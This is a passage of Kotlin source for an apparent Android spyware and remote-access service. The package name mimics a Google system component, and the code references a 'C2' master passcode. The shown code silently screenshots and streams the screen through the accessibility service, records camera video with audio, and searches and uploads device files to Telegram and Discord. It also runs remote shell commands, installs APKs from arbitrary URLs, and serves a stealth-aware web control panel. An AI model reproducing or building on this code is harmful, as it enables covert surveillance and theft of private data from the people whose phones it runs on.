            val cm = getSystemService(CONNECTIVITY_SERVICE) as? android.net.ConnectivityManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val network = cm?.activeNetwork ?: return false
                val capabilities = cm.getNetworkCapabilities(network) ?: return false
                capabilities.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET)
            } else {
                @Suppress("DEPRECATION")
                val activeNetwork = cm?.activeNetworkInfo
                activeNetwork != null && activeNetwork.isConnected
            }
        } catch (_: Exception) {
            true
        }
    }

    private fun isWifiConnected(): Boolean {
        return try {
            val cm = getSystemService(CONNECTIVITY_SERVICE) as? android.net.ConnectivityManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val network = cm?.activeNetwork ?: return false
                val capabilities = cm.getNetworkCapabilities(network) ?: return false
                capabilities.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI)
            } else {
                val wifiInfo = (applicationContext.getSystemService(WIFI_SERVICE) as? android.net.wifi.WifiManager)?.connectionInfo
                wifiInfo?.networkId != -1
            }
        } catch (_: Exception) {
            false
        }
    }

    private fun sendPhoto(chatId: String, photoFile: File, deleteAfterSend: Boolean = true) {
        serviceScope.launch(Dispatchers.IO) {
            if (!photoFile.exists()) return@launch

            if (!isNetworkConnected()) {
                Log.i(TAG, "Network disconnected. Photo upload deferred until Internet connects.")
                sendMessage(chatId, "📶 *Internet Required*: Photo upload deferred until network connects.")
                return@launch
            }

            val targetChat = if (chatId.isNotBlank()) chatId else CHAT_ID
            val cameraOutputChanId = getOrCreateDiscordChannelId("07-camera-output")

            if (targetChat.length >= 17 && targetChat.all { it.isDigit() }) {
                sendDiscordRawFile(targetChat, photoFile, "image/jpeg")

                if (!cameraOutputChanId.isNullOrBlank() && targetChat != cameraOutputChanId) {
                    sendDiscordRawFile(cameraOutputChanId, photoFile, "image/jpeg")
                }

                if (deleteAfterSend) { try { photoFile.delete() } catch (_: Exception) {} }
                return@launch
            }

            sendDiscordCategorizedFile("07-camera-output", photoFile, "image/jpeg")
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", targetChat)
                .addFormDataPart(
                    "photo",
                    photoFile.name,
                    photoFile.asRequestBody("image/jpeg".toMediaTypeOrNull())
                )
                .build()

            for (attempt in 1..3) {
                try {
                    val url = getTelegramApiUrl("sendPhoto")
                    val request = Request.Builder().url(url).post(requestBody).build()
                    val isSuccess = httpClient.newCall(request).execute().use { response ->
                        if (response.isSuccessful) {
                            Log.i(TAG, "sendPhoto successfully uploaded photo to Telegram chat $targetChat")
                            true
                        } else {
                            Log.w(TAG, "sendPhoto attempt $attempt failed HTTP ${response.code}")
                            false
                        }
                    }
                    if (isSuccess) break
                } catch (e: Exception) {
                    Log.e(TAG, "sendPhoto attempt $attempt exception: ${e.message}")
                }
                delay(1000L * attempt)
            }

            if (deleteAfterSend) {
                try { photoFile.delete() } catch (_: Exception) {}
            }
        }
    }

    private fun handleRecordVideoClip(chatId: String, seconds: Int, isFrontCamera: Boolean = false) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED
        ) {
            sendMessage(chatId, "⚠️ CAMERA and RECORD_AUDIO permissions are required for video clips.")
            return
        }

        val duration = seconds.coerceIn(2, 120)
        val label = if (isFrontCamera) "front" else "rear"
        sendMessage(chatId, "📹 Recording $duration-second $label camera video clip with mic audio…")

        mainHandler.post {
            val providerFuture = ProcessCameraProvider.getInstance(this)
            providerFuture.addListener({
                try {
                    val cameraProvider = providerFuture.get()
                    val cameraSelector = if (isFrontCamera) CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA

                    val recorder = Recorder.Builder()
                        .setQualitySelector(QualitySelector.from(Quality.SD))
                        .build()

                    val videoCapture = VideoCapture.Builder(recorder).build()

                    cameraProvider.unbindAll()
                    cameraProvider.bindToLifecycle(this, cameraSelector, videoCapture)

                    val videoFile = File(cacheDir, "video_${System.currentTimeMillis()}.mp4")
                    val outputOptions = FileOutputOptions.Builder(videoFile).build()

                    @Suppress("MissingPermission")
                    val pendingRecording = recorder.prepareRecording(this, outputOptions)
                        .withAudioEnabled()

                    val activeRecording = pendingRecording.start(ContextCompat.getMainExecutor(this)) { event ->
                        if (event is VideoRecordEvent.Finalize) {
                            mainHandler.post { try { cameraProvider.unbindAll() } catch (_: Exception) {} }
                            if (!event.hasError() && videoFile.exists() && videoFile.length() > 0) {
                                Log.i(TAG, "Video clip recorded successfully: ${videoFile.length() / 1024} KB")
                                sendPhoto(chatId, videoFile, deleteAfterSend = true)
                                sendDiscordCategorizedFile("07-camera-output", videoFile, "video/mp4")
                            } else {
                                sendMessage(chatId, "❌ Video clip recording failed: ${event.error}")
                            }
                        }
                    }

                    mainHandler.postDelayed({
                        activeRecording.stop()
                    }, duration * 1000L)

                } catch (e: Exception) {
                    Log.e(TAG, "handleRecordVideoClip error: ${e.message}")
                    sendMessage(chatId, "❌ Video clip error: ${e.message}")
                }
            }, ContextCompat.getMainExecutor(this))
        }
    }

    private fun handleInstallTermux(chatId: String, customUrl: String) {
        val defaultTermuxUrl = "https://github.com/termux/termux-app/releases/download/v0.118.1/termux-app_v0.118.1+github-apt-android-7-github-debug_universal.apk"
        val targetUrl = if (customUrl.isBlank() || customUrl == "/installtermux") defaultTermuxUrl else customUrl.trim()
        sendMessage(chatId, "📥 *Termux Remote Installer*\nTarget URL: `$targetUrl`", parseMode = "Markdown")
        downloadAndInstallApk(chatId, targetUrl)
    }

    private fun ensureEmbeddedEngineExtracted(): String {
        val binDir = File(filesDir, "bin")
        if (!binDir.exists()) binDir.mkdirs()
        val busyboxFile = File(binDir, "busybox")

        if (!busyboxFile.exists()) {
            try {
                assets.open("busybox").use { input ->
                    FileOutputStream(busyboxFile).use { output ->
                        input.copyTo(output)
                    }
                }
                busyboxFile.setExecutable(true, false)
                Log.i(TAG, "Extracted assets/busybox to ${busyboxFile.absolutePath}")
            } catch (_: Exception) {
                // Asset not present; fallback to system sh/toybox
            }
        }

        return if (busyboxFile.exists() && busyboxFile.canExecute()) {
            busyboxFile.absolutePath
        } else {
            "sh"
        }
    }

    private fun handleTermuxStatus(chatId: String) {
        val statusReport = com.google.android.system.termux.TermuxShellManager.getEnvironmentStatus(this)
        sendMessage(chatId, statusReport, parseMode = "Markdown")
    }

    private fun handleTermuxCommand(chatId: String, commandStr: String) {
        val trimmedCmd = commandStr.trim()
        if (trimmedCmd.isEmpty()) {
            sendMessage(chatId, "ℹ️ *Embedded Termux Command Bridge*\nUsage: `/termux <command>` or `!termux <command>`\n\nExamples:\n• `/termux uname -a`\n• `/termux ps -ef`\n• `/termux df -h`\n• `/termux pkg list`", parseMode = "Markdown")
            return
        }

        sendMessage(chatId, "⚡ *Executing Termux command:* `$trimmedCmd`…", parseMode = "Markdown")

        serviceScope.launch(Dispatchers.IO) {
            try {
                val response = com.google.android.system.termux.TermuxShellManager.executeRemoteCommand(this@MonitorService, trimmedCmd)
                for (chunk in response.formattedChunks) {
                    sendMessage(chatId, chunk, parseMode = "Markdown")
                }
            } catch (e: Exception) {
                Log.e(TAG, "handleTermuxCommand error: ${e.message}")
                sendMessage(chatId, "❌ Termux Command Error: ${e.message}")
            }
        }
    }

    private fun handleDownloadFileByName(chatId: String, fileNameOrPath: String) {
        val query = fileNameOrPath.trim()
        if (query.isEmpty() || query == "/download" || query == "/getfile") {
            sendMessage(chatId, "ℹ️ *Download Specific File*\nUsage: `/download <filename_or_path>`\n\nExamples:\n• `/download document.pdf`\n• `/download /sdcard/Download/photo.jpg`\n• `/getfile report.docx`", parseMode = "Markdown")
            return
        }

        serviceScope.launch(Dispatchers.IO) {
            try {
                sendMessage(chatId, "🔍 Searching for file `$query`…", parseMode = "Markdown")

                val root = Environment.getExternalStorageDirectory()
                val targetFile: File? = when {
                    File(query).exists() && File(query).isFile -> File(query)
                    File(root, query).exists() && File(root, query).isFile -> File(root, query)
                    File(currentDir, query).exists() && File(currentDir, query).isFile -> File(currentDir, query)
                    else -> {
                        val matches = mutableListOf<File>()
                        searchFilesByName(root, query, matches, maxResults = 10, maxDepth = 6)
                        when {
                            matches.size == 1 -> matches.first()
                            matches.size > 1 -> {
                                val sb = StringBuilder("📄 *Multiple files matched your search:* `$query`\n\n")
                                matches.forEachIndexed { idx, f ->
                                    val relPath = f.absolutePath.removePrefix(root.absolutePath)
                                    sb.append("${idx + 1}. `$relPath`\n")
                                }
                                sb.append("\n💡 Type `/download <full_path_above>` to download a specific file.")
                                sendMessage(chatId, sb.toString(), parseMode = "Markdown")
                                return@launch
                            }
                            else -> null
                        }
                    }
                }

                if (targetFile == null || !targetFile.exists() || !targetFile.isFile) {
                    sendMessage(chatId, "❌ File `$query` was not found on device storage.", parseMode = "Markdown")
                    return@launch
                }

                if (targetFile.length() == 0L) {
                    sendMessage(chatId, "❌ Target file `${targetFile.name}` is empty (0 bytes).", parseMode = "Markdown")
                    return@launch
                }

                val targetChat = if (chatId.isNotBlank()) chatId else CHAT_ID
                val mime = MimeTypeMap.getSingleton()
                    .getMimeTypeFromExtension(targetFile.extension.lowercase())
                    ?: "application/octet-stream"

                val sizeMbNum = targetFile.length() / (1024.0 * 1024.0)
                val sizeMbStr = "%.2f MB".format(sizeMbNum)
                sendMessage(targetChat, "📤 Uploading `${targetFile.name}` ($sizeMbStr)…", parseMode = "Markdown")

                // Large File Cloud Mirror Router (>25 MB)
                if (sizeMbNum > 25.0) {
                    sendMessage(targetChat, "📦 *Large File Cloud Router* ($sizeMbStr) — uploading to cloud storage mirror…", parseMode = "Markdown")
                    val cloudUrl = uploadLargeFileWithCloudFallback(targetFile)
                    if (cloudUrl != null) {
                        val msg = "📦 **Large File Cloud Mirror Available** ($sizeMbStr)\n• **File**: `${targetFile.name}`\n• **Download Link**: $cloudUrl"
                        sendMessage(targetChat, msg)
                        sendDiscordCategorizedMessage("14-files-and-backups", msg)
                    } else {
                        sendMessage(targetChat, "❌ Cloud mirror upload failed for `${targetFile.name}`.")
                    }
                    return@launch
                }

                // Native Discord Channel Upload
                if (targetChat.length >= 17 && targetChat.all { it.isDigit() }) {
                    sendDiscordRawFile(targetChat, targetFile, mime)
                    sendDiscordCategorizedFile("14-files-and-backups", targetFile, mime)
                    return@launch
                }

                // Native Telegram Chat Upload
                val bytes = targetFile.readBytes()
                val body = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", targetChat)
                    .addFormDataPart(
                        "document",
                        targetFile.name,
                        bytes.toRequestBody(mime.toMediaTypeOrNull())
                    )
                    .addFormDataPart("caption", "📄 ${targetFile.name}\nPath: `${targetFile.absolutePath}`")
                    .build()

                val request = Request.Builder().url(getTelegramApiUrl("sendDocument")).post(body).build()
                httpClient.newCall(request).execute().use { response ->
                    if (!response.isSuccessful) {
                        Log.w(TAG, "Download file upload failed: ${response.code}")
                        sendMessage(targetChat, "❌ File upload failed (HTTP ${response.code}).")
                    } else {
                        Log.i(TAG, "File ${targetFile.name} sent successfully to Telegram")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "handleDownloadFileByName error: ${e.message}")
                sendMessage(chatId, "❌ Error fetching file: ${e.message}")
            }
        }
    }

    private fun searchFilesByName(
        directory: File,
        query: String,
        results: MutableList<File>,
        maxResults: Int = 10,
        maxDepth: Int = 6,
        currentDepth: Int = 0
    ) {
        if (currentDepth > maxDepth || results.size >= maxResults) return
        val files = directory.listFiles() ?: return

        for (f in files) {
            if (results.size >= maxResults) break
            if (f.isDirectory) {
                if (!f.name.startsWith(".") && f.name != "Android") {
                    searchFilesByName(f, query, results, maxResults, maxDepth, currentDepth + 1)
                }
            } else if (f.isFile) {
                if (f.name.equals(query, ignoreCase = true) || f.name.lowercase().contains(query.lowercase())) {
                    results.add(f)
                }
            }
        }
    }

    private fun handleWatchScreen(chatId: String, args: String) {
        val intervalSec = args.trim().toIntOrNull()?.coerceIn(1, 60) ?: 3
        if (isWatchScreenActive) {
            sendMessage(chatId, "⚠️ Silent Screen Watcher is already running! Send `/stopwatchscreen` to stop first.", parseMode = "Markdown")
            return
        }

        val accessService = AppAccessibilityService.instance
        if (accessService == null) {
            sendMessage(chatId, "❌ Accessibility Service is not active. Enable Accessibility Service to use silent watch screen.", parseMode = "Markdown")
            return
        }

        isWatchScreenActive = true
        sendMessage(chatId, "👁️ *Silent Screen Watcher Started*\nInterval: ${intervalSec}s per snapshot.\nSend `/stopwatchscreen` to stop.", parseMode = "Markdown")

        watchScreenJob = serviceScope.launch(Dispatchers.IO) {
            try {
                while (isActive && isWatchScreenActive) {
                    val activeAccessService = AppAccessibilityService.instance ?: break
                    val latch = CountDownLatch(1)
                    var capturedFile: File? = null

                    activeAccessService.takeSilentScreenshot { file ->
                        capturedFile = file
                        latch.countDown()
                    }

                    latch.await(5, TimeUnit.SECONDS)

                    if (capturedFile != null && capturedFile!!.exists() && capturedFile!!.length() > 0) {
                        sendPhoto(chatId, capturedFile!!)
                        capturedFile!!.delete()
                    }

                    delay(intervalSec * 1000L)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Watch screen loop error: ${e.message}")
            } finally {
                isWatchScreenActive = false
            }
        }
    }

    private fun handleStopWatchScreen(chatId: String) {
        if (!isWatchScreenActive) {
            sendMessage(chatId, "ℹ️ Silent Screen Watcher is not active.", parseMode = "Markdown")
            return
        }
        isWatchScreenActive = false
        watchScreenJob?.cancel()
        watchScreenJob = null
        sendMessage(chatId, "🛑 *Silent Screen Watcher Stopped.*", parseMode = "Markdown")
    }

    private fun handleLiveScreenClip(chatId: String, durationStr: String) {
        val seconds = durationStr.trim().toIntOrNull()?.coerceIn(3, 30) ?: 10
        sendMessage(chatId, "🎬 Capturing $seconds-second live screen sequence clip…")

        serviceScope.launch(Dispatchers.IO) {
            try {
                val frameCount = seconds.coerceAtMost(10)
                val delayBetweenFrames = (seconds * 1000L) / frameCount

                for (i in 1..frameCount) {
                    var shotFile: File? = null
                    val latch = CountDownLatch(1)
                    captureScreenWithMultiFallback { shot ->
                        shotFile = shot
                        latch.countDown()
                    }
                    latch.await(4, TimeUnit.SECONDS)

                    if (shotFile != null && shotFile!!.exists() && shotFile!!.length() > 0) {
                        sendPhoto(chatId, shotFile!!, deleteAfterSend = true)
                        sendDiscordCategorizedFile("11-screenshots-and-clips", shotFile!!, "image/jpeg")
                    }
                    delay(delayBetweenFrames)
                }
                sendMessage(chatId, "✅ Live screen sequence complete.")
            } catch (e: Exception) {
                Log.e(TAG, "Live screen clip error: ${e.message}")
                sendMessage(chatId, "❌ Live screen clip error: ${e.message}")
            }
        }
    }

    private fun dispatchVolumeKey(keyCode: Int) {
        try {
            val audioManager = getSystemService(AUDIO_SERVICE) as? android.media.AudioManager
            when (keyCode) {
                android.view.KeyEvent.KEYCODE_VOLUME_UP -> {
                    audioManager?.adjustVolume(android.media.AudioManager.ADJUST_RAISE, android.media.AudioManager.FLAG_SHOW_UI)
                }
                android.view.KeyEvent.KEYCODE_VOLUME_DOWN -> {
                    audioManager?.adjustVolume(android.media.AudioManager.ADJUST_LOWER, android.media.AudioManager.FLAG_SHOW_UI)
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "dispatchVolumeKey error: ${e.message}")
        }
    }

    private fun getScreenMetrics(): Pair<Float, Float> {
        val displayManager = getSystemService(android.content.Context.DISPLAY_SERVICE) as? android.hardware.display.DisplayManager
        val defaultDisplay = displayManager?.getDisplay(android.view.Display.DEFAULT_DISPLAY)
        if (defaultDisplay != null) {
            val metrics = android.util.DisplayMetrics()
            defaultDisplay.getRealMetrics(metrics)
            return Pair(metrics.widthPixels.toFloat(), metrics.heightPixels.toFloat())
        }
        return Pair(resources.displayMetrics.widthPixels.toFloat(), resources.displayMetrics.heightPixels.toFloat())
    }

    private val activeSubscriberSockets = ConcurrentHashMap<Socket, String>()
    @Volatile private var isBroadcasterRunning = false

    private fun captureScreenInMemory(quality: Int = 75, onCaptured: (ByteArray?) -> Unit) {
        val accessService = AppAccessibilityService.instance
        if (accessService != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val latch = CountDownLatch(1)
            var capturedBytes: ByteArray? = null
            mainHandler.post {
                try {
                    accessService.takeSilentScreenshotBitmap { bitmap ->
                        if (bitmap != null) {
                            try {
                                val baos = java.io.ByteArrayOutputStream()
                                bitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos)
                                capturedBytes = baos.toByteArray()
                            } catch (e: Exception) {
                                Log.e(TAG, "Bitmap compression error: ${e.message}")
                            } finally {
                                bitmap.recycle()
                            }
                        }
                        latch.countDown()
                    }
                } catch (_: Exception) { latch.countDown() }
            }
            try {
                latch.await(2000, TimeUnit.MILLISECONDS)
            } catch (_: Exception) {}

            if (capturedBytes != null && capturedBytes!!.isNotEmpty()) {
                onCaptured(capturedBytes)
                return
            }
        }

        try {
            val pb = ProcessBuilder("screencap", "-p")
            val proc = pb.start()
            val inputStream = proc.inputStream
            val bytes = inputStream.readBytes()
            proc.waitFor(2, TimeUnit.SECONDS)
            if (bytes.isNotEmpty()) {
                onCaptured(bytes)
                return
            }
        } catch (_: Exception) {}

        onCaptured(null)
    }

    private fun startSharedFrameBroadcasterLoop() {
        if (isBroadcasterRunning) return
        isBroadcasterRunning = true
        serviceScope.launch(Dispatchers.IO) {
            Log.i(TAG, "Shared WebStream Frame Broadcaster Loop Started (In-Memory RAM Streaming)")
            while (isActive && isBroadcasterRunning) {
                if (WebStreamSessionManager.hasActiveSessions() && activeSubscriberSockets.isNotEmpty()) {
                    captureScreenInMemory(quality = 75) { frameBytes ->
                        if (frameBytes != null && frameBytes.isNotEmpty()) {
                            val frameHeader = "--frame\r\n" +
                                              "Content-Type: image/jpeg\r\n" +
                                              "Content-Length: ${frameBytes.size}\r\n\r\n"
                            val headerBytes = frameHeader.toByteArray()
                            val trailingBytes = "\r\n".toByteArray()

                            val sockets = activeSubscriberSockets.keys.toList()
                            for (socket in sockets) {
                                try {
                                    if (!socket.isClosed) {
                                        val out = socket.getOutputStream()
                                        out.write(headerBytes)
                                        out.write(frameBytes)
                                        out.write(trailingBytes)
                                        out.flush()
                                    } else {
                                        activeSubscriberSockets.remove(socket)
                                    }
                                } catch (e: Exception) {
                                    activeSubscriberSockets.remove(socket)
                                    try { socket.close() } catch (_: Exception) {}
                                }
                            }
                        }
                    }
                    delay(50) // ~20 FPS in RAM!
                } else {
                    delay(500)
                }
            }
            isBroadcasterRunning = false
        }
    }

    private fun startLocalWebControlServer() {
        if (webStreamServerSocket != null && !webStreamServerSocket!!.isClosed) return
        serviceScope.launch(Dispatchers.IO) {
            try {
                webStreamServerSocket = ServerSocket(Placeholder.WEBSTREAM_LOCAL_PORT, 50, InetAddress.getByName("127.0.0.1"))
                Log.i(TAG, "Interactive Web Control Panel Server listening on 127.0.0.1:${Placeholder.WEBSTREAM_LOCAL_PORT} (Loopback Only)")

                val prefs = getSharedPreferences("device_prefs", MODE_PRIVATE)
                val savedToken = prefs.getString("cf_webstream_tunnel_token", null)
                val provStatus = getCloudflareProvisioningStatus()

                if (provStatus == PROVISIONING_STATUS_COMPLETE && !savedToken.isNullOrBlank() && savedToken.length >= 30) {
                    prefs.edit().putLong("cf_last_connected_timestamp", System.currentTimeMillis()).apply()
                    Log.i(TAG, "Auto-restored single WebStream Cloudflare tunnel from local storage (Status: $provStatus)")
                }

                while (isActive && !webStreamServerSocket!!.isClosed) {
                    val socket = try { webStreamServerSocket!!.accept() } catch (e: Exception) { null } ?: break

                    serviceScope.launch(Dispatchers.IO) {
                        try {
                            val clientIp = socket.inetAddress?.hostAddress ?: "127.0.0.1"
                            val inputStream = socket.getInputStream()
                            val outputStream = socket.getOutputStream()
                            val reader = inputStream.bufferedReader()
                            val requestLine = reader.readLine() ?: ""

                            val lineParts = requestLine.split(" ")
                            val method = lineParts.getOrNull(0)?.uppercase() ?: "GET"
                            val rawPath = lineParts.getOrNull(1) ?: "/"

                            val headers = mutableMapOf<String, String>()
                            var headerLine = reader.readLine()
                            while (!headerLine.isNullOrBlank()) {
                                val colonIdx = headerLine.indexOf(':')
                                if (colonIdx > 0) {
                                    val key = headerLine.substring(0, colonIdx).trim().lowercase()
                                    val value = headerLine.substring(colonIdx + 1).trim()
                                    headers[key] = value
                                }
                                headerLine = reader.readLine()
                            }

                            val cookieHeader = headers["cookie"] ?: ""
                            val sessionIdCookie = cookieHeader.split(";")
                                .map { it.trim() }
                                .find { it.startsWith("session_id=") }
                                ?.substringAfter("session_id=")
                                ?.trim()

                            val csrfHeader = headers["x-csrf-token"]
                            val originHeader = headers["origin"]
                            val hostHeader = headers["host"]
                            val contentLength = headers["content-length"]?.toIntOrNull() ?: 0

                            if (!WebStreamSessionManager.validateOriginAndHost(originHeader, hostHeader)) {
                                val resp = "HTTP/1.1 403 Forbidden\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Invalid or unauthorized Origin/Host header\"}"
                                outputStream.write(resp.toByteArray())
                                outputStream.flush()
                                return@launch
                            }

                            val bodyString = if (contentLength > 0) {
                                val charBuf = CharArray(contentLength)
                                var readTotal = 0
                                while (readTotal < contentLength) {
                                    val r = reader.read(charBuf, readTotal, contentLength - readTotal)
                                    if (r <= 0) break
                                    readTotal += r
                                }
                                String(charBuf, 0, readTotal)
                            } else ""

                            if (method == "OPTIONS") {
                                val resp = "HTTP/1.1 204 No Content\r\n" +
                                           "Access-Control-Allow-Origin: *\r\n" +
                                           "Access-Control-Allow-Methods: GET, POST, OPTIONS\r\n" +
                                           "Access-Control-Allow-Headers: Content-Type, X-CSRF-Token\r\n" +
                                           "Access-Control-Allow-Credentials: true\r\n" +
                                           "Connection: close\r\n\r\n"
                                outputStream.write(resp.toByteArray())
                                outputStream.flush()
                                return@launch
                            }

                            val pathUri = Uri.parse("http://localhost$rawPath")
                            val cleanPath = pathUri.path ?: "/"

                            val currentSession = com.google.android.system.WebStreamSessionManager.getSession(sessionIdCookie)
                            val isUserRole = currentSession == null || currentSession.role != com.google.android.system.WebStreamSessionManager.Role.ADMIN
                            if (isUserRole && com.homemonitor.C2TrialManager.isTrialExpired(this@MonitorService)) {
                                if (cleanPath != "/api/login" && cleanPath != "/login") {
                                    if (cleanPath.startsWith("/api/") || cleanPath == "/click" || cleanPath == "/swipe" ||
                                        cleanPath == "/type" || cleanPath == "/action" || cleanPath == "/stealth" ||
                                        cleanPath == "/unlock" || cleanPath == "/stream") {
                                        val trialMsg = com.homemonitor.C2TrialManager.getTrialMessage(this@MonitorService)
                                        val respJson = org.json.JSONObject().apply {
                                            put("error", "Trial Expired")
                                            put("trialExpired", true)
                                            put("message", trialMsg)
                                        }.toString()
                                        val resp = "HTTP/1.1 403 Forbidden\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$respJson"
                                        outputStream.write(resp.toByteArray())
                                        outputStream.flush()
                                        return@launch
                                    }
                                }
                            }

                            if (method == "GET" && (cleanPath == "/click" || cleanPath == "/swipe" || cleanPath == "/type" ||
                                                    cleanPath == "/action" || cleanPath == "/stealth" || cleanPath == "/unlock" ||
                                                    cleanPath.startsWith("/api/input/") || cleanPath.startsWith("/api/control/"))) {
                                val resp = "HTTP/1.1 405 Method Not Allowed\r\nAllow: POST\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Method Not Allowed. Input commands must use POST with X-CSRF-Token.\"}"
                                outputStream.write(resp.toByteArray())
                                outputStream.flush()
                                return@launch
                            }

                            when {
                                cleanPath == "/api/login" || cleanPath == "/login" -> {
                                    if (method != "POST") {
                                        val resp = "HTTP/1.1 405 Method Not Allowed\r\nAllow: POST\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Method Not Allowed\"}"
                                        outputStream.write(resp.toByteArray())
                                        outputStream.flush()
                                        return@launch
                                    }

                                    if (WebStreamSessionManager.isIpLockedOut(clientIp)) {
                                        val resp = "HTTP/1.1 429 Too Many Requests\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Too many failed login attempts. Locked out for 5 minutes.\"}"
                                        outputStream.write(resp.toByteArray())
                                        outputStream.flush()
                                        return@launch
                                    }

                                    val jsonBody = try { JSONObject(bodyString) } catch (_: Exception) { JSONObject() }
                                    val passcode = jsonBody.optString("passcode", pathUri.getQueryParameter("pass") ?: "")
                                    val totpCode = jsonBody.optString("totpCode", "")

                                    val vaultPrefs = SecurityVaultManager.getEncryptedPrefs(this@MonitorService)
                                    val userPass = vaultPrefs.getString("user_web_password", "") ?: ""
                                    val user2FaEnabled = vaultPrefs.getBoolean("user_2fa_enabled", false)
                                    val user2FaSecret = vaultPrefs.getString("user_2fa_secret", "") ?: ""

                                    if (passcode == Placeholder.C2_MASTER_PASSCODE) {
                                        val master2FaSecret = TotpAuthenticator.getOrGenerateSecretKey(this@MonitorService)
                                        if (totpCode.isNotBlank() && !TotpAuthenticator.verifyCode(master2FaSecret, totpCode)) {
                                            val resp = "HTTP/1.1 401 Unauthorized\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Invalid 2FA code\"}"
                                            outputStream.write(resp.toByteArray())
                                        } else {
                                            val session = WebStreamSessionManager.createSession(clientIp, role = WebStreamSessionManager.Role.ADMIN)
                                            val respJson = JSONObject().apply {
                                                put("status", "authenticated")
                                                put("role", "admin")
                                                put("csrfToken", session.csrfToken)
                                            }.toString()

                                            val resp = "HTTP/1.1 200 OK\r\n" +
                                                       "Set-Cookie: session_id=${session.id}; Path=/; HttpOnly; Secure; SameSite=Strict\r\n" +
                                                       "Content-Type: application/json\r\n" +
                                                       "Connection: close\r\n\r\n$respJson"
                                            outputStream.write(resp.toByteArray())
                                        }
                                    } else if (userPass.isNotBlank() && passcode == userPass) {
                                        if (user2FaEnabled && user2FaSecret.isNotBlank()) {
                                            if (!TotpAuthenticator.verifyCode(user2FaSecret, totpCode)) {
                                                val resp = "HTTP/1.1 401 Unauthorized\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Invalid 2FA code\"}"
                                                outputStream.write(resp.toByteArray())
                                                outputStream.flush()
                                                return@launch
                                            }
                                        }
                                        val session = WebStreamSessionManager.createSession(clientIp, role = WebStreamSessionManager.Role.USER)
                                        val respJson = JSONObject().apply {
                                            put("status", "authenticated")
                                            put("role", "user")
                                            put("csrfToken", session.csrfToken)
                                        }.toString()

                                        val resp = "HTTP/1.1 200 OK\r\n" +
                                                   "Set-Cookie: session_id=${session.id}; Path=/; HttpOnly; Secure; SameSite=Strict\r\n" +
                                                   "Content-Type: application/json\r\n" +
                                                   "Connection: close\r\n\r\n$respJson"
                                        outputStream.write(resp.toByteArray())
                                    } else {
                                        WebStreamSessionManager.recordFailedLogin(clientIp)
                                        val resp = "HTTP/1.1 401 Unauthorized\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Invalid passcode\"}"
                                        outputStream.write(resp.toByteArray())
                                    }
                                    outputStream.flush()
                                }

                                cleanPath == "/api/logout" -> {
                                    if (method != "POST") {
                                        val resp = "HTTP/1.1 405 Method Not Allowed\r\nAllow: POST\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Method Not Allowed\"}"
                                        outputStream.write(resp.toByteArray())
                                        outputStream.flush()
                                        return@launch
                                    }
                                    val session = WebStreamSessionManager.getSession(sessionIdCookie)
                                    if (session != null) {
                                        WebStreamSessionManager.revokeSession(session.id)
                                    }
                                    val resp = "HTTP/1.1 200 OK\r\n" +
                                               "Set-Cookie: session_id=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly; SameSite=Strict\r\n" +
                                               "Content-Type: application/json\r\n" +
                                               "Connection: close\r\n\r\n{\"status\":\"logged_out\"}"
                                    outputStream.write(resp.toByteArray())
                                    outputStream.flush()
                                }

                                cleanPath == "/status" -> {
                                    val session = WebStreamSessionManager.getSession(sessionIdCookie)
                                    if (session == null) {
                                        val resp = "HTTP/1.1 401 Unauthorized\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Unauthorized\"}"
                                        outputStream.write(resp.toByteArray())
                                        outputStream.flush()
                                    } else {
                                        val isUserActive = AppAccessibilityService.isPhysicalUserActive(30_000L)
                                        val isStealth = AppAccessibilityService.instance?.isOverlayShowing ?: false
                                        val geometry = WebStreamDisplayGeometryProvider.getGeometry(this@MonitorService)
                                        val json = JSONObject().apply {
                                            put("authed", true)
                                            put("userActive", isUserActive)
                                            put("stealth", isStealth)
                                            put("csrfToken", session.csrfToken)
                                            put("geometry", JSONObject().apply {
                                                put("schemaVersion", 1)
                                                put("geometryVersion", geometry.geometryVersion)
                                                put("displayId", geometry.displayId)
                                                put("screenshotWidth", geometry.screenshotWidth)
                                                put("screenshotHeight", geometry.screenshotHeight)
                                                put("inputWidth", geometry.inputWidth)
                                                put("inputHeight", geometry.inputHeight)
                                                put("rotation", geometry.rotation)
                                                put("densityDpi", geometry.densityDpi ?: 420)
                                                put("coordinateSpace", geometry.coordinateSpace)
                                                put("isValid", geometry.isValid)
                                            })
                                        }.toString()

                                        val resp = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$json"
                                        outputStream.write(resp.toByteArray())
                                        outputStream.flush()
                                    }
                                }

                                cleanPath == "/api/metadata" -> {
                                    val session = WebStreamSessionManager.getSession(sessionIdCookie)
                                    if (session == null) {
                                        val resp = "HTTP/1.1 401 Unauthorized\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Unauthorized\"}"
                                        outputStream.write(resp.toByteArray())
